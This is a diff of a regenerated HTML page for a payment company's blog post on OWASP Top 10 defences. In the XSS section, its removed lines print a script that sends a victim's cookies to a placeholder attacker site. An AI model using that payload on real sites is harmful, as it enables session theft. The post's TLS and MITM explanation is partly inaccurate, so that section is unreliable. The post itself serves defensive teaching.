@@ -7,8 +7,8 @@
 <title> | Soluspay | Secure Payments</title>
 
 <meta property='og:title' content=' - Soluspay | Secure Payments'>
-<meta property='og:description' content='OWASP The Open Web Application Security Project is an international non-profit organization dedicated to web application security. They&rsquo;re best know by OWASP Top 10, a curated list of top 10 most critical security risks. This post will highlight some of the practices we are following at Solus while building our systems.
-SQL injection This is one of the very common and the first item in OWASP Top 10. In it&rsquo;s simplest form, it is about sending a sql code through e.'>
+<meta property='og:description' content='OWASP The Open Web Application Security Project is an international non-profit organization dedicated to web application security. They&#39;re best know by OWASP Top 10, a curated list of top 10 most critical security risks. This post will highlight some of the practices we are following at Solus while building our systems.
+SQL injection This is one of the very common and the first item in OWASP Top 10. In it&#39;s simplest form, it is about sending a sql code through e.'>
 <meta property='og:url' content='/owasp/'>
 <meta property='og:site_name' content='Soluspay | Secure Payments'>
 <meta property='og:type' content='article'><meta property='og:image' content='https://www.gravatar.com/avatar/4e0dc6d8eae72b5852113cc623888826?s=256'><meta property='article:author' content='https://facebook.com/adonese12'><meta property='article:section' content='Post'><meta property='article:tag' content='noebs'><meta property='article:tag' content='electronic-payment'><meta property='article:tag' content='owasp'><meta property='article:tag' content='security'><meta property='article:published_time' content='2019-08-23T00:00:00&#43;02:00'/><meta property='article:modified_time' content='2019-08-23T00:00:00&#43;02:00'/><meta name='twitter:card' content='summary'><meta name='twitter:site' content='@_noebs'><meta name='twitter:creator' content='@_noebs'>
@@ -121,126 +121,99 @@ SQL injection This is one of the very common and the first item in OWASP Top 10.
     <h1 class="title"></h1>
     
     <div class="content">
-      
-
-<p><strong>OWASP</strong> The Open Web Application Security Project is an international non-profit organization dedicated to web application security. They&rsquo;re best know by OWASP Top 10, a curated list of top 10 most critical security risks. This post will highlight some of the practices we are following at Solus while building our systems.</p>
-
+      <p><strong>OWASP</strong> The Open Web Application Security Project is an international non-profit organization dedicated to web application security. They're best know by OWASP Top 10, a curated list of top 10 most critical security risks. This post will highlight some of the practices we are following at Solus while building our systems.</p>
 <h1 id="sql-injection">SQL injection</h1>
-
-<p>This is one of the very common and the first item in OWASP Top 10. In it&rsquo;s simplest form, it is about sending a sql code through e.g., HTML Form input field. For this to work, the server must be <em>enabling</em> executing such an action. Let&rsquo;s take this simple example (using Python):</p>
-
-<pre><code class="language-python">form = request.form()
-username = form[&quot;username&quot;]   # there's an form field called username
-sql.exec(username)    # This is a _sql injection_
-</code></pre>
-
-<p>It is almost always bad to execute raw sql queries. In fact, unless you DB is read-only, there&rsquo;s no need at ALL to allow raw sql queries execution.</p>
-
-<p>The solution is: Don&rsquo;t allow raw sql execution.</p>
-
+<p>This is one of the very common and the first item in OWASP Top 10. In it's simplest form, it is about sending a sql code through e.g., HTML Form input field. For this to work, the server must be <em>enabling</em> executing such an action. Let's take this simple example (using Python):</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">form <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>form()
+username <span style="color:#f92672">=</span> form[<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">username</span><span style="color:#e6db74">&#34;</span>]   <span style="color:#75715e"># there&#39;s an form field called username</span>
+sql<span style="color:#f92672">.</span><span style="color:#66d9ef">exec</span>(username)    <span style="color:#75715e"># This is a _sql injection_</span>
+</code></pre></div><p>It is almost always bad to execute raw sql queries. In fact, unless you DB is read-only, there's no need at ALL to allow raw sql queries execution.</p>
+<p>The solution is: Don't allow raw sql execution.</p>
 <h1 id="broken-authentication">Broken Authentication</h1>
-
-<p>This can be broken into two categories:
-- you&rsquo;re either building an insecure authentication system that exposes your users&rsquo; data,
-- or, your login system allows repeated logins attempts (brute-forcing)</p>
-
+<p>This can be broken into two categories:</p>
+<ul>
+<li>you're either building an insecure authentication system that exposes your users&rsquo; data,</li>
+<li>or, your login system allows repeated logins attempts (brute-forcing)</li>
+</ul>
 <p>We are using the industry standard practice here. We are using JWT for most of our authorization, while <em>planning</em> to use session cookies for browser based ones. There are huge debates about JWT and session cookies, but it is all boils down to your whole system design. Sometimes, JWT fits to the whole system (if your target clients are Android/iOS), and sometimes session cookies are great, esp if you target clients are browser based.</p>
-
-<p>For this, we have two solutions:
-- We are using HSTS (HTTP Strict Transport Security).</p>
-
+<p>For this, we have two solutions:</p>
+<ul>
+<li>We are using HSTS (HTTP Strict Transport Security).</li>
+</ul>
 <blockquote>
 <p>HSTS causes compliant browsers to strictly enforce web security practices. Specifically, it automatically turns all HTTP links into HTTPS links within an application, and it upgrades all SSL errors from warnings or bypassable errors into non-bypassable errors.</p>
 </blockquote>
-
 <h1 id="xss-cross-site-scription">XSS (Cross-site scription)</h1>
-
-<p>An attacker can send a malicious JS code (in the client code). It can be as bad as copying the user&rsquo;s cookies and gain control access to their session.</p>
-
+<p>An attacker can send a malicious JS code (in the client code). It can be as bad as copying the user's cookies and gain control access to their session.</p>
 <p>Suppose that you have an HTML form that allows your users to write some notes about their transactions, here is a sample code:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">form</span>&gt;
+&lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text&#34;</span>&gt;
+&lt;<span style="color:#f92672">label</span>&gt;Type your note here&lt;/<span style="color:#f92672">label</span>&gt;
+&lt;/<span style="color:#f92672">form</span>&gt;
+</code></pre></div><p>The user's form will be submitted <strong>and</strong> rendered in a new page! Now this is very dangerous and it what leads to XSS security breaches. Let's see this in action. The next HTML page which will render the form result is like this:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"><span style="color:#75715e">&lt;!--</span><span style="color:#75715e"> skipping through HTML head </span><span style="color:#75715e">--&gt;</span>
+&lt;<span style="color:#f92672">div</span>&gt;
+<span style="color:#75715e">&lt;!--</span><span style="color:#75715e"> form results go here </span><span style="color:#75715e">--&gt;</span>
+&lt;/<span style="color:#f92672">div</span>&gt;
 
-<pre><code class="language-html">&lt;form&gt;
-&lt;input type=&quot;text&quot;&gt;
-&lt;label&gt;Type your note here&lt;/label&gt;
-&lt;/form&gt;
-</code></pre>
-
-<p>The user&rsquo;s form will be submitted <strong>and</strong> rendered in a new page! Now this is very dangerous and it what leads to XSS security breaches. Let&rsquo;s see this in action. The next HTML page which will render the form result is like this:</p>
-
-<pre><code class="language-html">&lt;!-- skipping through HTML head --&gt;
-&lt;div&gt;
-&lt;!-- form results go here --&gt;
-&lt;/div&gt;
-
-</code></pre>
-
-<p>We expect our users to input stuff like time, text data BUT NOT JS CODE! What happens, if the users submitted <code>&lt;script&gt;alert(&quot;You have been spawned!&quot;)&lt;/script&gt;</code>. This will launch a JS code from suspecious user&rsquo;s input. Now, this code can be even worse and accesses the user&rsquo;s cookies.</p>
-
+</code></pre></div><p>We expect our users to input stuff like time, text data BUT NOT JS CODE! What happens, if the users submitted <code>&lt;script&gt;alert(&quot;You have been spawned!&quot;)&lt;/script&gt;</code>. This will launch a JS code from suspecious user's input. Now, this code can be even worse and accesses the user's cookies.</p>
 <h2 id="how-the-attacker-can-log-your-cookies">How the attacker can log your cookies</h2>
-
-<p>It is quite simply actually. You can access your website cookie by accessing the cookie property of document class:
-- use your browser inspector and go to console
-- print document.cookie
-and now you can access your cookies!</p>
-
+<p>It is quite simply actually. You can access your website cookie by accessing the cookie property of document class:</p>
+<ul>
+<li>use your browser inspector and go to console</li>
+<li>print document.cookie
+and now you can access your cookies!</li>
+</ul>
 <p>Now if the attacker wants to get that cookie, they will need to send it somewhere (most likey to a server/website they own)</p>
-
 <ul>
 <li>the attacker submits an unsafe js code that redirects the users to a new website (where they will log the cookie)</li>
 <li>now, the attacker does have access to your session and can do whatever they want while they are there (they can see your payment card info for instance, they can even submit a transaction assuming that your PIN is 0000 or your birthday)
 The JS code to get your cookie is just this:
-<code>
-&lt;script&gt;
-document.location=&quot;http://mybadwebsite.com/?cookie_handler=&quot; + document.cookie
-&lt;/script&gt;
-</code>
-<strong>This can be even smarter by redirecting the user back to their original website!</strong></li>
+`</li>
 </ul>
-
-<p>And now, when the user submits that un-sanitized inputs, it will:
-- redirect them to a new website <code>http://mybadwebsite.com</code>
-- it submits their cookie <code>document.cookie</code> to that website!</p>
-
-<p>Here are a few steps you can follow to be safe against these types of attacks:
-- Sanitize your users&rsquo; inputs! In GO <code>template/html</code> library (the templating engine in GO, much like jinja2), it by default scapes HTML and JS tags
-- If your website is something is form-like, there are a few things you can adopt:
-    - let your users use markdown (it is safer)
-    - you can specify some HTML elements as safe (e.g., <p>, <a>), and escape the rest. In this case, you will allow your users to have rich text experience</p>
-
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<p>`
+<strong>This can be even smarter by redirecting the user back to their original website!</strong></p>
+<p>And now, when the user submits that un-sanitized inputs, it will:</p>
+<ul>
+<li>redirect them to a new website <code>http://mybadwebsite.com</code></li>
+<li>it submits their cookie <code>document.cookie</code> to that website!</li>
+</ul>
+<p>Here are a few steps you can follow to be safe against these types of attacks:</p>
+<ul>
+<li>Sanitize your users&rsquo; inputs! In GO <code>template/html</code> library (the templating engine in GO, much like jinja2), it by default scapes HTML and JS tags</li>
+<li>If your website is something is form-like, there are a few things you can adopt:
+<ul>
+<li>let your users use markdown (it is safer)</li>
+<li>you can specify some HTML elements as safe (e.g., <!-- raw HTML omitted -->, <!-- raw HTML omitted -->), and escape the rest. In this case, you will allow your users to have rich text experience</li>
+</ul>
+</li>
+</ul>
 <h2 id="the-solution-to-all-of-the-above-issues-is-very-simple-use-a-framework">The solution to all of the above issues is very simple: USE A FRAMEWORK!</h2>
-
-<p>The solution to all of the above issues is very simple, use a web framework! All of the modern web frameworks solves these rather naive secruity issues! I have worked with Python (Django and Flask and Starlette) and I&rsquo;ve also worked with GO, all of them have built-in support for these common security issues! So, in practice, adapting <em>any</em> of modern web framework will save you from all of these issues, for free!</p>
-
+<p>The solution to all of the above issues is very simple, use a web framework! All of the modern web frameworks solves these rather naive secruity issues! I have worked with Python (Django and Flask and Starlette) and I've also worked with GO, all of them have built-in support for these common security issues! So, in practice, adapting <em>any</em> of modern web framework will save you from all of these issues, for free!</p>
 <h2 id="security-misconfigurations">Security Misconfigurations</h2>
-
 <p>I have seen this in the wild very recently in a payment system. We as developers love to have excessive stack trace and error reports while developing our services. Because there are so many errors we ought to face, it is very important that we get the whole stack trace so we get more insights into our error and fix it. However, that must stay in the development face ONLY! These stack traces (and perhaps other info) are very useful for attackers to gain access to your server.</p>
-
 <p>Many of web frameworks (Django for instance) have DEBUG mode where instead of returing 500 INTERNAL SERVER ERROR, they also include the stack trace (when DEBUG=True) in Django <code>settings.py</code>. While this is very important while developing, it is very catastrophic in real life!</p>
-
 <h1 id="sensitive-data-exposure-and-mitm">Sensitive data exposure and MITM</h1>
-
-<p>We work in payment systems and it is very important to secure our user&rsquo;s data (their payment card info). These systems must adhere to even strictier rules than what OWASP offers as they have VERY sensitive data. PCI-DSS compliancy should be a #1 target for such systems and they shoud monitor and audit their systems and upgrade them regularly. <em>Security should be a profound part of their system design!</em></p>
-
+<p>We work in payment systems and it is very important to secure our user's data (their payment card info). These systems must adhere to even strictier rules than what OWASP offers as they have VERY sensitive data. PCI-DSS compliancy should be a #1 target for such systems and they shoud monitor and audit their systems and upgrade them regularly. <em>Security should be a profound part of their system design!</em></p>
 <blockquote>
 <p>While getting EBS certificate is quite enough to have a secure system, we know that vendors often tend to modify their EBS-certified systems. This is a huge issue and it renders the whole EBS certification part useless.</p>
 </blockquote>
-
 <h2 id="what-we-do-in-noebs-to-secure-your-data">What we do in noebs to secure your data</h2>
-
 <ul>
-<li>KISS (keeping it simple, stupid!). We are keeping it simple: we are only storing your PAN and expiration date, we don&rsquo;t store anything else!</li>
+<li>KISS (keeping it simple, stupid!). We are keeping it simple: we are only storing your PAN and expiration date, we don't store anything else!</li>
 <li>We had long discussions about storing PAN and expiration date, but we plan to change the way we store them VERY SOON!</li>
 <li>We have a Zero-log policy, so even if an attacker has breached our system, they will find no useful data!</li>
 </ul>
-
 <h2 id="mitm-attacks">MITM Attacks</h2>
-
-<p>Man in the middle attacks are a very special and interesting class of attacks.
-- You are using https for securing your system
-- You have successfully solved CSRF, XSS and SQL Injections (hooray!)
-- and now everything is fine, right?</p>
-
-<p>As we know, TLS certificates are used to encrypt our request and make it secure. They are to be unbroken since the protocol is a public-private key exchange to decypher the http request. Meaning that, there&rsquo;s only one private key (in the server), and each client has their unique public key. So what could possibly go wrong?
+<p>Man in the middle attacks are a very special and interesting class of attacks.</p>
+<ul>
+<li>You are using https for securing your system</li>
+<li>You have successfully solved CSRF, XSS and SQL Injections (hooray!)</li>
+<li>and now everything is fine, right?</li>
+</ul>
+<p>As we know, TLS certificates are used to encrypt our request and make it secure. They are to be unbroken since the protocol is a public-private key exchange to decypher the http request. Meaning that, there's only one private key (in the server), and each client has their unique public key. So what could possibly go wrong?
 Telecos (or MITM attackers) inject a tampered root CA in the host machine and replace their original one. When you send your &ldquo;secure&rdquo; request, it is being encrypted using the new root CA and sent to the server.
 The attacker, having acquired your root CA, can then decypher your network traffic and have access to all of it.</p>
 
